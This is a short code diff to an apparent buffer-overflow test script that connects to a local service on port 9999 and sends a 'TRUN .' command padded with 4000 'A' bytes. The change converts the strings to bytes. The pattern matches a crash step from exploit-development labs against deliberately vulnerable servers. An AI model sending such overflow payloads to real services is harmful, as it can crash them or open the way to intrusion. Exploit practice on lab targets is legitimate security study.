@@ -5,8 +5,8 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = '127.0.0.1'
 port = 9999
 
-buf = 'A' * 4000
-payload = 'TRUN .' + buf
+buf = b'A' * 4000
+payload = b'TRUN .' + buf
 
 try:
     s.connect((host, port))
